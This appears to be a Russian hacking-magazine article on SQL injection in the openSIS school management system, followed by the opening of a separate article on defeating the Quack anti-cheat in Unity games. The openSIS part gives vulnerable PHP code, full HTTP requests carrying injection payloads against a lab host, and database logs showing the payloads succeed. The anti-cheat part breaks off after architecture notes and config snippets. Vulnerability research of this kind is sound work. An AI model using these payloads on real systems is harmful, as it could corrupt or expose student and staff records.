3


Query   SELECT la.PASSWORD FROM students s,login_authentication la
 WHERE la.USER_ID=s.STUDENT_ID  AND s.BIRTHDATE='2024-04-30'
 AND la.PROFILE_ID=3 AND s.STUDENT_ID=XSS

Как видишь, s.STUDENT_ID не заключен в кавычки, что делает эту переменную
уязвимой для SQL-инъекций. Я могу использовать полезную нагрузку XSS OR
1=1:


tail -f  /var/log/mysql/mysql.log | grep -i 'xss'
2024-04-27T13:35:15.303711Z     9 Query
 SELECT s.* FROM students s,login_authentication la
 WHERE la.USER_ID=s.STUDENT_ID AND la.USERNAME='aaaaa'
 AND s.BIRTHDATE='2024-04-25' AND s.STUDENT_ID=XSS OR 1= 1
 AND la.PROFILE_ID= 3


2024-04-27T13:35:29.563796Z    10 Query
 SELECT la.PASSWORD FROM students s,login_authentication la
 WHERE la.USER_ID=s.STUDENT_ID  AND s.BIRTHDATE='2024-04-30'
 AND la.PROFILE_ID=3 AND s.STUDENT_ID=XSS OR 1= 1

Вот как  выглядит уязвимый код для  восстановления  юзернейма. Файл
ResetUserInfo.php, строка 395:


$get_stu_info = DBGet(DBQuery('SELECT la.PASSWORD FROM students s,
login_authentication la
 WHERE la.USER_ID=s.STUDENT_ID  AND s.BIRTHDATE='' . date('Y-m-d',
strtotime($stu_dob)) . ''
 AND la.PROFILE_ID=3 AND s.STUDENT_ID=' . $username_stn_id . ''));

А вот уязвимый код, который обрабатывает форму восстановления пароля.
Файл ResetUserInfo.php, строка 296:


$stu_info = DBGet(DBQuery('SELECT s.* FROM students s,
login_authentication la
 WHERE la.USER_ID=s.STUDENT_ID AND la.USERNAME='' . $uname . ''
 AND s.BIRTHDATE='' . date('Y-m-d', strtotime($stu_dob)) . ''
 AND s.STUDENT_ID=' . $password_stn_id . ' AND la.PROFILE_ID=3'));

Отсюда мы можем понять, что если грепнуть по выражению =' . $, то мы,
вероятно, получим все параметры, которые не заключены в кавычки.
   Например, используем вот такую команду:


find . -exec grep -R "=' \\. \\$"  {} \; 2>/dev/null | grep 'DBQuery'

В результате мы получим все параметры, которые не заключены в кавычки,
а также множество других параметров, которые могут быть уязвимы. Про‐
верять их все не стоит нашего времени, поэтому продолжим искать уяз‐
вимости:


./index.php: $usr_prof = DBGet(DBQuery('SELECT * FROM user_profiles
WHERE ID=' . $login_uniform['PROFILE_ID']));
./index.php: $check_enrollment = DBGet(DBQuery('SELECT COUNT(*) AS
REC_EX FROM student_enrollment WHERE STUDENT_ID=' . $login_uniform[
'USER_ID'] . ' AND END_DATE<'' . date(' Y-m-d') . '' ORDER BY ID DESC
LIMIT 0,1'));
./index.php:                $opensis_staff_access = DBGet(DBQuery(
'SELECT * FROM staff_school_info WHERE STAFF_ID=' . $login_Check[ 1][
'STAFF_ID']));


АУТЕНТИФИЦИРОВАННЫЕ SQLI

School Setup
У этого приложения очень интересный подход к защите от SQL-инъекций,
называемый SingleQuoteReplace.


function singleQuoteReplace($param1, $param2, $param3) {
    if(empty($param1))  $param1 = false;
    if(empty($param2))  $param2 = false;
    return str_replace("'", "''", str_replace("'", "'", $param3));

Эта функция, по сути, заменяет одну одинарную кавычку двумя одинарными
кавычками, тем самым предотвращая SQL-инъекцию.
   Давай проверим параметр TITLE в запросе ниже:


POST /openSIS/Modules.php?modname=schoolsetup/MarkingPeriods.php&mp_
term=FY&marking_period_id=18&year_id=&semester_id=&quarter_id= HTTP/
1.1
Host: 192.168.147.131
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0
Cookie: PHPSESSID=m0is4jrd2i2l5bba7ulomve02o
Connection: close


tables[18][TITLE]=XSS&tables[18][SHORT_NAME]=FYaaaaaaa&tables[18][
DOES_COMMENTS]=Y&tables[18][DOES_GRADES]=Y&tables[18][DOES_EXAM]=Y&
month_tables[18][START_DATE]=09&day_tables[18][START_DATE]=01&year_
tables[18][START_DATE]=2023&month_tables[18][END_DATE]=08&day_tables[
18][END_DATE]=31&year_tables[18][END_DATE]=2024&month_tables[18][
POST_START_DATE]=09&day_tables[18][POST_START_DATE]=01&year_tables[
18][POST_START_DATE]=2023&month_tables[18][POST_END_DATE]=08&day_
tables[18][POST_END_DATE]=31&year_tables[18][POST_END_DATE]=2024&btn_
save=Save

Когда я отправляю запрос, подобный приведенному выше, я вижу:


2024-04-27T14:35:37.678456Z    70 Query
 SELECT * FROM marking_periods WHERE upper(TITLE)='XSS'
 AND SCHOOL_ID='1' AND SYEAR='2024'AND MARKING_PERIOD_ID NOT IN('18')

Если вместо XSS я введу XSS', SQL-запрос будет немного другим:


2024-04-27T14:36:10.103810Z    81 Query
 SELECT * FROM marking_periods WHERE upper(TITLE)='XSS'''
 AND SCHOOL_ID='1' AND SYEAR='2024'
 AND MARKING_PERIOD_ID NOT IN('18')

Моя одинарная кавычка заменяется двумя одинарными кавычками. Чтобы
сделать этот случай более понятным, ты можешь использовать простой PHP-
код, чтобы проверить это самостоятельно.


<?php
function singleQuoteReplace($param1, $param2, $param3) {
    if(empty($param1))  $param1 = false;
    if(empty($param2))  $param2 = false;
    return str_replace("'", "''", str_replace("'", "'", $param3));
}
echo singleQuoteReplace('', '', "XSS'");
echo "\n";
?>

Результат:



  root@ubuntu:~# php 1.php
  XSS''


Давай заглянем в исходники, относящиеся к этой части приложения. Нам
нужен файл modules/schoolsetup/MarkingPeriods.php, строка 271:


$TITLE_COUNT =  DBGet(DBQuery('SELECT * FROM marking_periods
 WHERE upper(TITLE)='' . strtoupper(singleQuoteReplace('', '',
$value)) . ''
 AND SCHOOL_ID='' . UserSchool() . '' AND SYEAR='' . UserSyear() . ''
 AND MARKING_PERIOD_ID NOT IN('' . $_REQUEST['marking_period_id'] .
'')'));

Есть еще один SQL-запрос, связанный с запросом выше:


UPDATE school_years SET TITLE='XSS''',TITLE='XSS''' WHERE
MARKING_PERIOD_ID='18'

Его код  находится в modules/schoolsetup/MarkingPeriods.php,  стро‐
ки 270–286:


$sql = 'UPDATE ' . $table . ' SET ';
 foreach ($columns as $column => $value) {
  $value = paramlib_validation($column, trim($value));
  if ($column == 'DOES_GRADES' && $value == '') {
   $sql_ex = 'update ' . $table . ' set DOES_EXAM='' where
marking_period_id='' . $_REQUEST['marking_period_id'] . ''';
  }
  if ($column == 'TITLE' && $columns['TITLE'] != '') {
   $TITLE_COUNT = DBGet(DBQuery('SELECT * FROM marking_periods WHERE
upper(TITLE)='' . strtoupper(singleQuoteReplace('', '', $value)) .
'' AND SCHOOL_ID='' . UserSchool() . '' AND SYEAR='' . UserSyear() .
''AND MARKING_PERIOD_ID NOT IN('' . $_REQUEST['marking_period_id'] .
'')'));


   if (is_countable($TITLE_COUNT) && count($TITLE_COUNT) > 0) {
    $err_msg = _titleAlreadyExists;
    break 2;
   } else {
    $sql .= $column . '='' . singleQuoteReplace('', '', trim(
$value)) . '',';
    $go = true;
   }
  }

Как видишь, наш запрос начинается с 'UPDATE ' . $table . ' SET ';.
Здесь $table — это, очевидно, имя таблицы. Дальше выполнение переходит
ко второму оператору if, потому что мы установили заголовок XSS:


if ($column == 'TITLE' && $columns['TITLE'] != '')

Теперь мы попадаем в блок else:


$sql .= $column . '='' . singleQuoteReplace('', '', trim($value)) .
'',';

Я использовал XSS' в качестве входных данных, и это дало такой SQL-запрос:


2024-04-27T14:58:52.933692Z   241 Query
 UPDATE school_years SET TITLE='XSS''',TITLE='XSS''',SHORT_
NAME='FYaaaaaaa',
 DOES_COMMENTS='Y',DOES_GRADES='Y',DOES_EXAM='Y',
 POST_START_DATE='2023-09-01',POST_END_DATE='2024-08-31' WHERE
MARKING_PERIOD_ID='18'

Я решил удалить SingleQuoteReplace и посмотреть, что изменится в зап‐
росе:


$sql .= $column . '='' . $value . '',';

SQL-запрос:


2024-04-27T14:58:12.880333Z   230 Query
 UPDATE school_years SET TITLE='XSS'',TITLE='XSS''',SHORT_NAME='
FYaaaaaaa',
 DOES_COMMENTS='Y',DOES_GRADES='Y',DOES_EXAM='Y',POST_START_DATE='
2023-09-01',
 POST_END_DATE='2024-08-31' WHERE MARKING_PERIOD_ID='18'

Только значение первого столбца экранировано, второй TITLE остался преж‐
ним. Я вернул код обратно и вместо 18 написал 18":


POST /openSIS/Modules.php?modname=schoolsetup/MarkingPeriods.php&mp_
term=FY&marking_period_id=18&year_id=&semester_id=&quarter_id= HTTP/
1.1
Host: 192.168.147.131
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0
Cookie: PHPSESSID=m0is4jrd2i2l5bba7ulomve02o
Connection: close
Content-Length: 546


tables[18''][TITLE]=XSS'&tables[18][SHORT_NAME]=FYaaaaaaa&tables[18][
DOES_COMMENTS]=Y&tables[18][DOES_GRADES]=Y&tables[18][DOES_EXAM]=Y&
month_tables[18][START_DATE]=09&day_tables[18][START_DATE]=01&year_
tables[18][START_DATE]=2023&month_tables[18][END_DATE]=08&day_tables[
18][END_DATE]=31&year_tables[18][END_DATE]=2024&month_tables[18][
POST_START_DATE]=09&day_tables[18][POST_START_DATE]=01&year_tables[
18][POST_START_DATE]=2023&month_tables[18][POST_END_DATE]=08&day_
tables[18][POST_END_DATE]=31&year_tables[18][POST_END_DATE]=2024&btn_
save=Save

Почему я заменил 18 в первом tables[]?
   Поскольку запрос был UPDATE school_years SET TITLE, логично было
изменить 18 в параметре TITLE. SQL-запрос сейчас такой:


2024-04-27T15:11:25.255965Z   314 Query UPDATE school_years SET TITLE
='XSS''',TITLE='XSS''' WHERE MARKING_PERIOD_ID='18'''

Почему XSS' был заменен XSS'', а 18'' остался как 18'' (то есть не изме‐
нился), если я вернул все в норму и включил функцию SingleQuoteReplace?
   Потому что в коде SingleQuoteReplace заменяет одну одинарную кавычку
двумя одинарными кавычками только в параметре первого столбца, а не
в других. Инъекция здесь осуществляется в параметр MARKING_PERIOD_ID,
и SingleQuoteReplace там не сработает.
  Я поменял 18" на 18'+OR+1%3d1%23. Теперь запрос такой:


POST /openSIS/Modules.php?modname=schoolsetup/MarkingPeriods.php&mp_
term=FY&marking_period_id=18&year_id=&semester_id=&quarter_id= HTTP/
1.1
Host: 192.168.147.131
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0
Cookie: PHPSESSID=m0is4jrd2i2l5bba7ulomve02o
Connection: close
Content-Length: 558


tables[18'+OR+1%3d1%23][TITLE]=XSS'&tables[18][SHORT_NAME]=FYaaaaaaa&
tables[18][DOES_COMMENTS]=Y&tables[18][DOES_GRADES]=Y&tables[18][
DOES_EXAM]=Y&month_tables[18][START_DATE]=09&day_tables[18][START_
DATE]=01&year_tables[18][START_DATE]=2023&month_tables[18][END_DATE]
=08&day_tables[18][END_DATE]=31&year_tables[18][END_DATE]=2024&month_
tables[18][POST_START_DATE]=09&day_tables[18][POST_START_DATE]=01&
year_tables[18][POST_START_DATE]=2023&month_tables[18][POST_END_DATE]
=08&day_tables[18][POST_END_DATE]=31&year_tables[18][POST_END_DATE]
=2024&btn_save=Save

SQL-запрос:


2024-04-27T15:14:17.857574Z   326 Query UPDATE school_years SET TITLE
='XSS''',TITLE='XSS''' WHERE MARKING_PERIOD_ID='18' OR 1=1#'

Некоторые случаи, включающие INSERT, могут быть трудными для тестирова‐
ния, поскольку тебе придется каждый раз удалять вставленные значения.
Один из таких случаев — в этом запросе:


POST /openSIS/Modules.php?modname=schoolsetup/SystemPreference.php&
modfunc=update&page_display=FAILURE HTTP/1.1
Host: 192.168.147.131
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0
Cookie: PHPSESSID=m0is4jrd2i2l5bba7ulomve02o
Connection: close


failure%5BFAIL_COUNT%5D=1111

SQL-запрос:


INSERT INTO system_preference_misc (FAIL_COUNT) VALUES(11111)

Код   SQL-запроса   сформирован   в   файле   modules/schoolsetup/
FailureCount.php, строки 31–47:


if ($_REQUEST['modfunc'] == 'update') {
    if ($_REQUEST['failure']) {
        $TOTAL_COUNT = DBGet(DBQuery("SELECT COUNT(FAIL_COUNT) AS
TOTAL_COUNT FROM system_preference_misc"));
        $TOTAL_COUNT = $TOTAL_COUNT[1]['TOTAL_COUNT'];
        if ($TOTAL_COUNT == 0 && $_REQUEST['failure']['FAIL_COUNT'])
{
            DBQuery('INSERT INTO system_preference_misc (FAIL_COUNT)
VALUES(' . $_REQUEST['failure']['FAIL_COUNT'] . ')');
        } else if ($TOTAL_COUNT == 1) {
            $sql = 'UPDATE system_preference_misc SET ';
            foreach ($_REQUEST['failure'] as $column_name => $value)
{
                $sql .= "$column_name='" . str_replace("'", "''",
str_replace("`", "''", $value)) . "',";
            }
            $sql = substr($sql, 0, -1) . ' WHERE 1=1';
            DBQuery($sql);
        }
    }
    unset($_REQUEST['failure']);
}




                                     Продолжение статьи →
ВЗЛОМ               ← НАЧАЛО СТАТЬИ
            OPENSIS   ДЫРЫ В
            РАЗБИРАЕМ SQL-ИНЪЕКЦИИ
                  НА ЖИВОМ ПРИМЕРЕ




Здесь нет проверки и очистки, следовательно, этот параметр также уязвим
для SQL-инъекций. И опять же, в этом случае мы можем использовать grep (
' .$ и получить другие уязвимые параметры.
   Разработчик явно попытался предотвратить SQL-инъекцию, удвоив встав‐
ленные двойные кавычки, но это привело лишь к курьезу.
   Отправляем запрос:


POST /openSIS/Modules.php?modname=schoolsetup/Courses.php&subject_
id=new HTTP/1.1
Host: 192.168.147.131
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0
Cookie: PHPSESSID=m0is4jrd2i2l5bba7ulomve02o
Connection: close
Content-Length: 51


tables%5Bcourse_subjects%5D%5Bnew%5D%5BTITLE%5D=XSS

Получается вот такой SQL-запрос:


2024-04-27T18:33:20.677481Z  1489 Query
 INSERT INTO course_subjects (SCHOOL_ID,SYEAR,TITLE)
 values('1','2024',"XSS")

Все выглядит нормально, но в коде двойная кавычка дублируется. Смотри
modules/schoolsetup/Courses.php, строку 1424:


$go = 0;
 foreach ($columns as $column => $value) {
     if ($value != '') {
         $value = trim(paramlib_validation($column, $value));
         $fields .= $column . ',';
         if (stripos($_SERVER['SERVER_SOFTWARE'], 'linux')) {
             $value = mysql_real_escape_string($value);
         }
         $value = str_replace('"', '""', $value);
         $values .= '"' . $value . '",';


         $go = true;
     }
 }

Это значит, что, если я введу XSS", эта строка превратится в XSS"". Но есть
и какая‑то санитизация, где именно она происходит, я так и не выяснил. Ког‐
да я ввожу строку XSS, она превращается в XSS". Но поскольку в приведенном
выше коде есть вызов функции str_replace, он исправит XSS" на XSS"", что
приведет к SQL-инъекции.
   Итого: разработчик применил две меры безопасности — удвоение кавыч‐
ки и санитизацию. И привело это только к созданию уязвимого кода, посколь‐
ку один подход противоречит другому и порядок их использования неверен.
  Я решил отправить еще один запрос с полезной нагрузкой XSS")#:


POST /openSIS/Modules.php?modname=schoolsetup/Courses.php&subject_
id=new HTTP/1.1
Host: 192.168.147.131
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0
Cookie: PHPSESSID=m0is4jrd2i2l5bba7ulomve02o
Connection: close
Content-Length: 54


tables%5Bcourse_subjects%5D%5Bnew%5D%5BTITLE%5D=XSS")#

SQL-запрос:


2024-04-27T18:38:34.728708Z  1495 Query
 INSERT INTO course_subjects (SCHOOL_ID,SYEAR,TITLE)
 values('1','2024',"XSS"")#")


Students
Случай, аналогичный описанному выше, произошел с одинарными кавыч‐
ками.
   Первый запрос:


POST /openSIS/Modules.php?modname=students/StudentFields.php&
table=student_field_categories HTTP/1.1
Host: 192.168.147.131
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/
537.36 (KHTML, like Gecko) Chrome/123.0.6312.122 Safari/537.36
Cookie: PHPSESSID=5iesmnaum69q6unsnaalqbi2tc
Connection: close


tables%5Bnew%5D%5BTITLE%5D=XSS&tables%5Bnew%5D%5BSORT_ORDER%5D=1111&
tables%5Bnew%5D%5BINCLUDE%5D=bbbb

SQL-запрос:


SELECT COUNT(*) AS TITLE_FOUND FROM student_field_categories WHERE
TITLE='XSS'

Код modules/students/StudentFields.php, строка 58:


  } elseif ($table == 'student_field_categories') {
  if (trim($_REQUEST['tables']['new']['TITLE']) != '') {
   $chk_title = DBGet(DBQuery('SELECT COUNT(*) AS TITLE_FOUND FROM
student_field_categories WHERE TITLE='' . str_replace("'", "''",
trim($_REQUEST['tables']['new']['TITLE'])) . '''));

Как видно из кода, он заменяет одну одинарную кавычку двумя одинарными
кавычками. Таким образом, он выйдет (') из введенной нами кавычки, а затем
добавит еще одну кавычку (''), тем самым выполнив SQL-инъекцию. Я буду
использовать нагрузку XSS'#:


2024-04-30T13:35:45.590461Z    47 Query SELECT COUNT(*) AS
TITLE_FOUND FROM student_field_categories WHERE TITLE='XSS''#'

Тот же случай произошел и в файле modules/students/EnrollmentCodes.
php, строки 37–54:


$sql = 'UPDATE student_enrollment_codes SET ';


 foreach ($columns as $column => $value) {
  if (($select_enroll[1]['TYPE'] == 'Roll' || $select_enroll[1][
'TYPE'] == 'TrnD' || $select_enroll[1]['TYPE'] == 'TrnE' || $value ==
'Roll' || $value == 'TrnD' || $value == 'TrnE') && $column == 'TYPE')
{
   $error = true;
   continue;
  }
  $value = paramlib_validation($column, trim($value));
  $sql .= $column . '='' . str_replace("'", "''", $value) . ' ',';
  $go = true;
 }
 $sql = substr($sql, 0, -1) . ' WHERE ID='' . $id . ''';
 if ($go)
  DBQuery($sql);


 if ($error) {
  ShowErrPhp(_canTEditTypeBecauseItIsNotEditable);
 }

Как ты видишь, для $id нет проверки, что делает его уязвимым для SQL-инъ‐
екций.


POST /openSIS/Modules.php?modname=students/EnrollmentCodes.php&
modfunc=update HTTP/1.1
Host: 192.168.147.131
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/
537.36 (KHTML, like Gecko) Chrome/124.0.6367.60 Safari/537.36
Cookie: PHPSESSID=5iesmnaum69q6unsnaalqbi2tc
Connection: close
Content-Length: 152


LO_search=&values[14''][TITLE]=AAAA&values[14][SHORT_NAME]=BBB&
values[14][TYPE]=Drop&values[new][TITLE]=&values[new][SHORT_NAME]=&
values[new][TYPE]=

SQL-запрос:


2024-04-30T13:41:58.636133Z   140 Query
 UPDATE student_enrollment_codes
 SET TITLE='AAAA ' WHERE ID='14'''

Я использовал полезную нагрузку 14' OR 1=1 -- -, SQL-запрос такой:


2024-04-30T13:43:42.143231Z   147 Query
 UPDATE student_enrollment_codes
 SET TITLE='AAAA ' WHERE ID='14' OR 1=1-- -'

В результате все названия были заменены.


Users
Это приложение продолжает удивлять меня: есть функции, которые на самом
деле предотвращают SQL-инъекции (и некоторые из них созданы самими
разработчиками), но разработчики эти каким‑то невообразимым образом
использовали эти функции так, что программа не просто осталась уяз‐
вимой — возможность для инъекций теперь есть вообще на каждой стра‐
нице!
   Инъекции можно предотвратить, например, перебирая значения из зап‐
роса средствами оператора foreach, как в строке 70 в modules/users/
includes/CertificationInfoInc.php:


foreach ($_REQUEST['values'] as $cert_id => $cert_value) {
  if ($cert_id && $cert_id != 'new') {
   $sql = "UPDATE staff_certification SET ";
   foreach ($cert_value as $column => $value) {
    if (!is_array($value))
     $sql .= $column . "='" . str_replace("'", "''", $value) . "',";
    else {
     $sql .= $column . "='||";
     foreach ($value as $val) {
      if ($val)
       $sql .= str_replace('"', '"', $val) . '||';
     }
     $sql .= "',";
    }
   }
   $sql = substr($sql, 0, -1) . " WHERE STAFF_CERTIFICATION_ID='
$cert_id'";


   DBQuery($sql);

Но здесь foreach, наоборот, создает ситуацию, благодаря которой SQLi
можно пропихнуть через любой параметр. Как видишь, $cert_id никак
не санитизируется и берется из значения "values", например:


POST /openSIS/Modules.php?modname=users/Staff.php&custom=staff&
include=CertificationInfoInc&category_id=4&staff_id=30&
modfunc=update HTTP/1.1
Host: 192.168.147.131
Content-Type: multipart/form-data; boundary=----
WebKitFormBoundaryQS9jXjB4QidjJBZp
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/
537.36 (KHTML, like Gecko) Chrome/124.0.6367.60 Safari/537.36
Cookie: PHPSESSID=0oelpc05g9clrnv5fdrvg8kvqr
Connection: close


------WebKitFormBoundaryQS9jXjB4QidjJBZp
Content-Disposition: form-data; name="error_handler"


------WebKitFormBoundaryQS9jXjB4QidjJBZp
Content-Disposition: form-data; name="LO_search"


Search
------WebKitFormBoundaryQS9jXjB4QidjJBZp
Content-Disposition: form-data; name="values[1][STAFF_CERTIFICATION_
NAME]"


AAAA2
------WebKitFormBoundaryQS9jXjB4QidjJBZp
Content-Disposition: form-data; name="month_values[1][STAFF_
CERTIFICATION_DATE]"


05
------WebKitFormBoundaryQS9jXjB4QidjJBZp
Content-Disposition: form-data; name="day_values[1][STAFF_
CERTIFICATION_DATE]"
...

Все, что содержит "values", уязвимо, включая те случаи, когда вместо циф‐
ры стоит текст, например values[new]. Запрос к базе данных выглядит сле‐
дующим образом:


root@ubuntu:~# tail -f  /var/log/mysql/mysql.log | grep 'WHERE
STAFF_CERTIFICATION_ID'
2024-05-02T17:37:22.846611Z  2032 Query
 UPDATE staff_certification  SET STAFF_CERTIFICATION_NAME='AAAA2',
 STAFF_PRIMARY_CERTIFICATION_INDICATOR=NULL,
 STAFF_CERTIFICATION_DATE='2024-05-01' ,
 STAFF_CERTIFICATION_EXPIRY_DATE='2024-05-31'
 WHERE STAFF_CERTIFICATION_ID='1'


2024-05-02T17:37:22.846988Z  2032 Query
 UPDATE staff_certification  SET
 STAFF_PRIMARY_CERTIFICATION_INDICATOR=NULL,
 STAFF_CERTIFICATION_DATE='2024-05-01' ,
 STAFF_CERTIFICATION_EXPIRY_DATE='2024-05-31'
 WHERE STAFF_CERTIFICATION_ID='2'
...

Если я заменю каждое значение другим числом, очевидно, количество апдей‐
тов увеличится и будет равно количеству чисел. Я заменил первые 16 зна‐
чений на числа от 1 до 15 (использовал 1 два раза):


------WebKitFormBoundaryQS9jXjB4QidjJBZp
Content-Disposition: form-data; name="error_handler"


------WebKitFormBoundaryQS9jXjB4QidjJBZp
Content-Disposition: form-data; name="LO_search"


Search
------WebKitFormBoundaryQS9jXjB4QidjJBZp
Content-Disposition: form-data; name="values[1][STAFF_CERTIFICATION_
NAME]"
...

SQL-запрос:


2024-05-02T17:39:02.393434Z  2208 Query
 UPDATE staff_certification
 SET STAFF_CERTIFICATION_NAME='AAAA2',STAFF_CERTIFICATION_DATE='-05'
 WHERE STAFF_CERTIFICATION_ID='1'


2024-05-02T17:39:02.394323Z  2208 Query UPDATE staff_certification
 SET STAFF_PRIMARY_CERTIFICATION_INDICATOR=NULL,
 STAFF_CERTIFICATION_DATE='2024-05-01' ,
 STAFF_CERTIFICATION_EXPIRY_DATE='2024-05-31'
 WHERE STAFF_CERTIFICATION_ID='4'

Всего есть 15 запросов UPDATE. Уязвимость легко продемонстрировать,
используя {n}'#:


month_values[15'#][STAFF_CERTIFICATION_DATE]
2024-05-02T17:41:05.612987Z  2253 Query UPDATE staff_certification
SET STAFF_CERTIFICATION_DATE='-05' WHERE STAFF_CERTIFICATION_ID='15
'#'


Валидация параметров
В openSIS есть валидация параметров, которую можно использовать, вызвав
функцию clean_param. Функция clean_param много раз вызывается в коде,
мы рассмотрим PARAM_NOTAGS и PARAM_ALPHA.


case PARAM_NOTAGS:       // Strip all tags
    $param = strip_tags($param);
    $param = str_replace('>', '', $param);
    return str_replace('<', '', $param);


 case PARAM_ALPHA:        // Remove everything not a-z
    return par_rep('/[^a-zA-Z#&]/i', '', $param);
    //  return replace_croatain($param);

Код PARAM_NOTAGS хорош для предотвращения XSS. Но я бы не использовал
его, потому что пользователю могут потребоваться теги в заголовке, так что
кодирование HTML было бы лучше в этом случае. PARAM_ALPHA очищает вход‐
ной параметр $param, удаляя все символы, которые не являются стандартны‐
ми буквами, # или &. Я видел использование этих кейсов в строках 114–
128 в modules/users/Profiles.php:


if (clean_param($_REQUEST['new_profile_title'], PARAM_NOTAGS) &&
AllowEdit()) {


    // $id = DBGet(DBQuery('SHOW TABLE STATUS LIKE '' .
'user_profiles' . '''));
    // $id[1]['ID'] = $id[1]['AUTO_INCREMENT'];
    // $id = $id[1]['ID'];
    $exceptions_RET = array();
    $_REQUEST['new_profile_title'] = str_replace("'", "''", $_REQUEST
['new_profile_title']);
    DBQuery('INSERT INTO user_profiles (TITLE,PROFILE) values('' .
clean_param($_REQUEST['new_profile_title'], PARAM_NOTAGS) . '','' .
clean_param($_REQUEST['new_profile_type'], PARAM_ALPHA) . '')');
    $_REQUEST['profile_id'] = mysqli_insert_id($connection);
    $xprofile = $_REQUEST['new_profile_type'];
    unset($_REQUEST['new_profile_title']);
    unset($_REQUEST['new_profile_type']);
    unset($_SESSION['_REQUEST_vars']['new_profile_title']);
    unset($_SESSION['_REQUEST_vars']['new_profile_type']);
}

Валидация new_profile_type с использованием PARAM_ALPHA предотвра‐
щает   SQL-инъекции,   поскольку   запрещает   использовать   кавычки.
Но PARAM_NOTAGS предназначен только для XSS.
   Вот такой запрос стриггерит уязвимость:


POST /openSIS/Modules.php?modname=users/Profiles.php&modfunc=update&
profile_id= HTTP/1.1
Host: 192.168.147.131
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/
537.36 (KHTML, like Gecko) Chrome/124.0.6367.60 Safari/537.36
Cookie: PHPSESSID=0oelpc05g9clrnv5fdrvg8kvqr
Connection: close


new_profile_title=aaaa')#&new_profile_type=admin

SQL-запрос:


2024-05-02T18:07:23.304858Z  2292 Query INSERT INTO user_profiles (
TITLE,PROFILE) values('aaaa'')#','admin')


ВЫВОДЫ

Итак, мы нашли огромный простор для SQL-инъекций. Некоторые проэксплу‐
атировать не выйдет, в других меры безопасности сами становились при‐
чиной инъекции, в третьих инъекция предотвращалась случайно.
   Неэксплуатируемые случаи — это те, в которых есть SQL-инъекция, но ты
ничего от нее не можешь получить, а только манипулируешь некоторыми дан‐
ными. Но даже эти случаи иногда считаются уязвимостями, поскольку они
угрожают  целостности  вводимых и  сохраняемых  данных (CVSS ~  2,7
AV:N/AC:L/PR:H/UI:N/S:U/C:N/I:L/A:N).
   Ну и лучшее я оставил напоследок: везде, где в приложении используются
значения  в  квадратных  скобках,  есть  возможность для  SQL-инъекции.
А используются они во всем приложении.
ВЗЛОМ





В этой статье я попробую показать, как соз‐
дать собственный чит, который будет про‐
тивостоять используемым в играх  анти‐
чит‑системам. Для этого нам понадобится
поупражняться в реверсе и познакомиться              neeko                                                                                       mynxold@gmail.com
с устройством игр, написанных на Unity.



Другие статьи цикла о написании читов
 • Вскрываем компьютерную игру и пишем трейнер на C++
 • Смотрим сквозь стены и делаем автоприцеливание для 3D-шутера




АНТИЧИТ

Итак, античит — это некая программа, которая мешает игрокам в онлайновые
игры получать нечестное преимущество за счет использования стороннего
ПО. Не буду пытаться объяснить это на абстрактном примере, лучше давай
сразу перейдем к практике. По дороге все поймешь!


Quick Universal Anti-Cheat Kit
Так как нет (или я просто не нашел) античитов уровня ядра с открытым
исходным кодом, то выбирать будем из опенсорсных античитов, в которых
присутствует  только  античит  пользовательского  уровня. Мой выбор пал
на античит Quick Universal Anti-Cheat Kit (далее Quack).
   Сразу предупреждаю, что Quack — это лишь простенькая опенсорсная
демонстрация концепции. Обойти ее проще, чем системы, которые исполь‐
зуются в популярных играх. Все коммерческие античиты работают как на
пользовательском уровне, так и  на уровне ядра. Причем самые важные
защитные функции обычно реализованы именно в виде драйвера.
   Однако для обучения Quack сгодится как нельзя лучше, и изложенное
дальше должно стать фундаментом для будущих изысканий.


           WARNING

                        Статья имеет ознакомительный характер и пред‐
                          назначена для оценки защищенности кода игр.
                       Автор  и  редакция  не  несут  ответственности
                        за любой вред,  причиненный с  применением
                          изложенной информации. Обратная разработка
                          античитов   нарушает   пользовательские   сог‐
                     лашения  игр,  поэтому,  повторяя  описанное
                        в этой статье на практике, ты действуешь на свой
                        страх и риск!



Архитектура Quack
Давай посмотрим на общую архитектуру античита глазами ее автора. Далее я
объясню, для чего нужен каждый выделенный на схеме компонент.





                                Архитектура Quack

Зеленым  цветом я выделил  клиентскую часть  (то, что будет работать
на компьютере игрока):
 • Protected video game — игра, которую мы запускаем на своем компьютере
   и которую будет защищать античит;
 • Anti-cheat .DLL — пользовательская часть античита, DLL, которая сущес‐
    твует в контексте созданного процесса игры и которая отвечает за защиту
   памяти процесса игры;
 • Standalone usermode anti-cheat process — пользовательская часть анти‐
   чита. Это главный модуль античита (оркестратор), который общается
   с пользовательской и ядерной частями, а также держит связь с сервером
   античита;
 • Kernel mode anti-cheat — ядерная часть античита. Отвечает за защиту двух
   других модулей античита. Не реализовано.

Синим цветом я выделил серверную часть (то, что будет работать вне компь‐
ютера игрока):
 • Master server — отвечает за хранение учетной записи игрока и управление
   ею;
 • Game server — отвечает за отслеживание состояния элементов в игре,
   а также местоположения игроков и врагов на карте;
 • Anti-cheat database — база данных игроков.


Настраиваем Quack
Если после развертывания Quack (как это сделать, смотри в руководстве на
GitHub и на YouTube) у тебя ничего работает, то советую повнимательнее изу‐
чить следующие файлы и настроить сетевые адреса и порты в соответствии
с реальными условиями.


GameDevCAServer\Program.cs
var settings = MongoClientSettings.FromConnectionString(env["DB_URI"
]);
settings.ServerApi = new ServerApi(ServerApiVersion.V1);


var mongoClient = new MongoClient(settings);
database = mongoClient.GetDatabase(env["DB_NAME"]);


Quack-server\src\main.js
class Config {
    static DB_URI = process.env.DB_URI
    static DB_NAME = process.env.DB_NAME
    static PORT = process.env.PORT


    static CLIENT = new MongoClient(this.DB_URI)


    static DEV_MODE = true
    static VERSION = process.env.npm_package_version
}


Quack-internal\constants.hpp
namespace constants {
    const LPCWSTR W_DLL_NAME { L"Quack-internal" };
